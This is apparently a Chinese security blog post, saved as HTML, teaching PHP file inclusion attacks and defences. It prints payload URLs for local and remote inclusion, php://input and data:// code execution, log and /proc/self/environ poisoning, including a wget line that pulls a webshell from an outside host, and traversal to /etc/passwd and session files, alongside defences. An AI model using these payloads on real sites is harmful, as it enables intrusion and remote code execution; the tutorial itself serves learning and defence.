@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hudielan.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fhudielan.png">
+  <link rel="mask-icon" href="/images/hudielan.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入密码') !== ''){
+                alert('密码错误');
+                history.back();
+            }
+        }
+    })();
+</script>
+  <meta name="description" content="关于文件包含的一些知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含">
+<meta property="og:url" content="http://example.com/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="影影之家">
+<meta property="og:description" content="关于文件包含的一些知识">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/20180112100157518.png">
+<meta property="article:published_time" content="2022-02-16T13:51:00.000Z">
+<meta property="article:modified_time" content="2022-02-17T11:55:56.014Z">
+<meta property="article:author" content="吴淑影">
+<meta property="article:tag" content="-web -ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/20180112100157518.png">
+
+<link rel="canonical" href="http://example.com/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>文件包含 | 影影之家</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">影影之家</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-love">
+
+    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="吴淑影">
+      <meta itemprop="description" content="Believe not all that you see nor half what you hear.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="影影之家">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-16 21:51:00" itemprop="dateCreated datePublished" datetime="2022-02-16T21:51:00+08:00">2022-02-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-17 19:55:56" itemprop="dateModified" datetime="2022-02-17T19:55:56+08:00">2022-02-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%B1%BB/" itemprop="url" rel="index"><span itemprop="name">知识类</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-meta-item leancloud_visitors" data-flag-title="文件包含" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>关于文件包含的一些知识</p>
+<span id="more"></span>
+
+<h1 id="文件包含原理"><a href="#文件包含原理" class="headerlink" title="文件包含原理"></a>文件包含原理</h1><p>文件包含漏洞是“代码注入”的一种。其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含。</p>
+<p>要想成功利用文件包含漏洞进行攻击，需要满足以下两个条件：</p>
+<ol>
+<li>Web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件;</li>
+<li>用户能够控制该动态变量。</li>
+</ol>
+<h1 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h1><h2 id="1-本地文件包含"><a href="#1-本地文件包含" class="headerlink" title="1.本地文件包含"></a>1.本地文件包含</h2><p>   包含服务器本身存在的恶意文件<br>   a.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    b.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b=$_GET[&#x27;id&#x27;];</span><br><span class="line">include($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/b.php?id=a.txt //返回phpinfo页面</span><br></pre></td></tr></table></figure>
+
+<p>注：</p>
+<ul>
+<li>两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）</li>
+<li>被包含的页面的后缀无论是什么都会当做PHP解析</li>
+</ul>
+<h2 id="2-远程文件包含"><a href="#2-远程文件包含" class="headerlink" title="2.远程文件包含"></a>2.远程文件包含</h2><p>包含其他网站上的恶意文件</p>
+<p>远程文件包含利用条件：</p>
+<ul>
+<li>在php.ini中allow_url_fopen=on、allow_url_include=on</li>
+<li>allow_url_fopen = On (允许打开URL文件,预设启用)<br>allow_url_fopen = Off (禁止打开URL文件)<br>allow_url_include = Off (禁止引用URL文件,新版增加功能,预设关闭)<br>allow_url_include = On (允许引用URL文件,新版增加功能）</li>
+</ul>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/b.php?id=http://ip/文件路径</span><br></pre></td></tr></table></figure>
+
+<p>注：</p>
+<p>​      远程包含的文件路径必须是绝对路径</p>
+<h1 id="常见的存在文件包含的脚本语言以及函数"><a href="#常见的存在文件包含的脚本语言以及函数" class="headerlink" title="常见的存在文件包含的脚本语言以及函数"></a>常见的存在文件包含的脚本语言以及函数</h1><h2 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行</span><br><span class="line">require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行</span><br><span class="line">include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-jsp-servlet"><a href="#2-jsp-servlet" class="headerlink" title="2.jsp/servlet"></a>2.jsp/servlet</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ava.io.file()</span><br><span class="line">java.io.filereader()</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-asp"><a href="#3-asp" class="headerlink" title="3.asp"></a>3.asp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include file</span><br><span class="line">include virtual</span><br></pre></td></tr></table></figure>
+
+<h1 id="各个协议如何实现命令执行"><a href="#各个协议如何实现命令执行" class="headerlink" title="各个协议如何实现命令执行"></a>各个协议如何实现命令执行</h1><h2 id="1-00截断"><a href="#1-00截断" class="headerlink" title="1.%00截断"></a>1.%00截断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.是否需要截断是根据包含函数后有没有对包含的文件进行拼接一个后缀，如果有就需要使用%00进行截断</span><br><span class="line">2.当php版本&lt;=5.2使用%00截断</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-file：-用于访问本地文件系统"><a href="#2-file：-用于访问本地文件系统" class="headerlink" title="2.file：//:用于访问本地文件系统"></a>2.file：//:用于访问本地文件系统</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.条件(php.ini)：</span><br><span class="line">    allow_url_fopen   off/on</span><br><span class="line">    allow_url_include off/on</span><br><span class="line">2.使用方法：file：//[文件的绝对路径和文件名]</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-php-访问各个输入输出流"><a href="#3-php-访问各个输入输出流" class="headerlink" title="3.php://:访问各个输入输出流"></a>3.php://:访问各个输入输出流</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php伪协议：</span><br><span class="line">    php：//filter：用于读取源码并进行bash64编码输出；</span><br><span class="line">    条件（php.ini）：</span><br><span class="line">        allow_url_fope   off/on</span><br><span class="line">        allow_url_include off/on</span><br><span class="line">    php：//input：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；</span><br><span class="line">    条件(php.ini)：</span><br><span class="line">        allow_url_fope   off/on</span><br><span class="line">        allow_url_include on</span><br><span class="line">    php://stdin是只读的，php://stdout 和 php://stderr 是只写的。</span><br><span class="line">    php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</span><br><span class="line">    php://fd 允许直接访问指定的文件描述符。</span><br></pre></td></tr></table></figure>
+
+<p>4.zip://,bzip://,zlib://：均属于压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">    allow_url_fope   off/on</span><br><span class="line">    allow_url_include off/on</span><br><span class="line">zip://使用方法：</span><br><span class="line">    zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</span><br><span class="line">bzip2://使用方法：</span><br><span class="line">    bzip2://file.bz2</span><br><span class="line">zlib://使用方法：</span><br><span class="line">    zlib://file.gz</span><br></pre></td></tr></table></figure>
+
+<p>5.data://</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">    allow_url_fope   on</span><br><span class="line">    allow_url_include on</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/20180112100157518.png" alt="20180112100157518 (889×328)"></p>
+<p>6.phar://:数据流包装器</p>
+<h1 id="对文件包含的利用"><a href="#对文件包含的利用" class="headerlink" title="对文件包含的利用"></a>对文件包含的利用</h1><h2 id="1-包含上传文件"><a href="#1-包含上传文件" class="headerlink" title="1.包含上传文件"></a>1.包含上传文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用户上传了一个可执行文件，通过文件包含那个文件实现漏洞利用</span><br><span class="line">防御：</span><br><span class="line">    做好上传限制</span><br><span class="line">    隐藏好文件路径</span><br><span class="line">    设置访问权限、执行权限</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-伪协议"><a href="#2-伪协议" class="headerlink" title="2.伪协议"></a>2.伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">php：//input：用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。</span><br><span class="line">条件：</span><br><span class="line">    php &lt;5.0 ，allow_url_include=Off 情况下也可以用</span><br><span class="line">    php &gt; 5.0，只有在allow_url_fopen=On 时才能使用</span><br><span class="line">例：</span><br><span class="line">    http：//localhost/include/file.php?file=php://input     //URL</span><br><span class="line">    &lt;?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;)?&gt;  //POST,创建一个文件a.php；并写入phpinfo</span><br><span class="line">data://：将原本的include的文件流重定向到了用户可控制的输入流中</span><br><span class="line">条件：</span><br><span class="line">    allow_url_include=On</span><br><span class="line">    php &gt; 5.2</span><br><span class="line">例：</span><br><span class="line">    http://localhost/file.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==      //base64加密&lt;？php system(whoami);？&gt;；直接执行命令</span><br><span class="line">    http://localhost/image.php?imagedata=data://image/jpeg;base64,..... // 后面加上图片木马；图片命令执行</span><br><span class="line">php://filter:这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过</span><br><span class="line">例：</span><br><span class="line">    http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=C:\oneword    //可以跟绝对路径也可以跟相对路径</span><br><span class="line">    http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=[http|https|ftp]://www.bbb.com/2.txt   //远程路径</span><br><span class="line">防御：</span><br><span class="line">    尽量使用安全版本的php</span><br><span class="line">    做好php的安全配置</span><br><span class="line">    对相应目录做相应权限设置</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-包含日志文件"><a href="#3-包含日志文件" class="headerlink" title="3.包含日志文件"></a>3.包含日志文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1、日志的默认路径</span><br><span class="line">    /etc/httpd/logs/access_log或/var/log/httpd/access_log        //apache+linux</span><br><span class="line">    D:xamppapachelogsaccess.log或D:xamppapachelogserror.log  //apache_win2003</span><br><span class="line">    C:WINDOWSsystem32Logfiles                     //iis6.0+win2003</span><br><span class="line">    %SystemDrive%inetpublogsLogFiles            //iis7.0+win2003</span><br><span class="line">    nginx 日志文件在用户安装目录的logs目录下</span><br><span class="line">2、web中间件默认配置uoh文件</span><br><span class="line">    /etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd        //apache+linux</span><br><span class="line">    C:/Windows/system32/inetsrv/metabase.xml          //iis6.0+win2003</span><br><span class="line">    C:WindowsSystem32inetsrvconfigapplicationHost.config           //iis7.0+win</span><br><span class="line">3、利用</span><br><span class="line">    访问http://www.xx.com/&lt;?php phpinfo(); ?&gt;时，&lt;?php phpinfo(); ?&gt;也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：</span><br><span class="line">    http://localhost/include/file.php?file=../../apache/logs/access.log //（这里利用相对路径，找到日志文件，并以php解析的方式打开)</span><br><span class="line">4、防御</span><br><span class="line">    隐藏或修改默认日志文件</span><br><span class="line">    设置日志文件读取权限</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-包含-proc-self-environ"><a href="#4-包含-proc-self-environ" class="headerlink" title="4.包含/proc/self/environ"></a>4.包含/proc/self/environ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、找文件包含漏洞</span><br><span class="line">    www.aaa.com/view.php?page=../</span><br><span class="line">    www.aaa.com/view.php?page=../../../../../etc/passwd</span><br><span class="line">2、检查proc/self/environ是否可以访问</span><br><span class="line">    www.aaa.com/view.php?page=../../../../../proc/self/environ</span><br><span class="line">3、如果可读就注入代码</span><br><span class="line">    访问：www.aaa.com/view.php?page=../../../../../proc/self/environ</span><br><span class="line">    选择User-Agent 写代码如下：&lt;?system(&#x27;wget http://www.yourweb.com/oneword.txt -O shell.php&#x27;);?&gt;    //提交请求；我们的命令将被执行(将下载http://www.yourweb.com/oneword.txt，并将其保存为它在shell.php网站目录)，我们的shell也就被创建,.如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器.</span><br><span class="line">4、访问shell</span><br><span class="line">5、防御：</span><br><span class="line">    设置proc/self/environ不可访问</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-包含Session文件"><a href="#5-包含Session文件" class="headerlink" title="5.包含Session文件"></a>5.包含Session文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../tmp/sess_1sv3pu01f97dp3qcfef8i2b9r2         //读取session文件</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见的绕过与防御"><a href="#常见的绕过与防御" class="headerlink" title="常见的绕过与防御"></a>常见的绕过与防御</h1><h2 id="1-00截断-1"><a href="#1-00截断-1" class="headerlink" title="1.%00截断"></a>1.%00截断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">说明：</span><br><span class="line">    PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。</span><br><span class="line">防御：</span><br><span class="line">    禁用0字节</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-超长字符截断"><a href="#2-超长字符截断" class="headerlink" title="2.超长字符截断"></a>2.超长字符截断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line">    利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。</span><br><span class="line">    我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。</span><br><span class="line">    而利用&quot;./&quot;的方式即可构造出超长目录字符串</span><br><span class="line">防御：</span><br><span class="line">    限制用户输入字符长度</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-任意目录遍历"><a href="#3-任意目录遍历" class="headerlink" title="3.任意目录遍历"></a>3.任意目录遍历</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line">    使用&quot;../../../&quot;这样的方式来返回到上层目录中，这种方式又被称为&quot;目录遍历(Path Traversal)&quot;。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)</span><br><span class="line">防御：</span><br><span class="line">    目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。</span><br><span class="line">    open_basedir的作用是限制在某个特定目录下PHP能打开的文件(有点像chroot的感觉)</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-问号截断"><a href="#4-问号截断" class="headerlink" title="4.问号截断"></a>4.问号截断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用：</span><br><span class="line">    http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?</span><br><span class="line">防御：</span><br><span class="line">    关闭远程文件包含的配置选项allow_url_include = Off</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-防御总结"><a href="#5-防御总结" class="headerlink" title="5.防御总结"></a>5.防御总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、无需情况下设置allow_url_include和allow_url_fopen为关闭</span><br><span class="line">2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</span><br><span class="line">3、尽量不使用动态包含</span><br><span class="line">4、严格检查变量是否已经初始化。</span><br><span class="line">5、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。</span><br><span class="line">6、严格检查include类的文件包含函数中的参数是否外界可控。</span><br><span class="line">7、不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</span><br><span class="line">8、在发布应用程序之前测试所有已知的威胁。</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>吴淑影
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">http://example.com/2022/02/16/文件包含/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web-ctf/" rel="tag"># -web -ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E4%B9%8B00%E6%88%AA%E6%96%AD/" rel="prev" title="文件上传绕过之00截断">
+      <i class="fa fa-chevron-left"></i> 文件上传绕过之00截断
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/" rel="next" title="ctfhub文件包含刷题">
+      ctfhub文件包含刷题 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
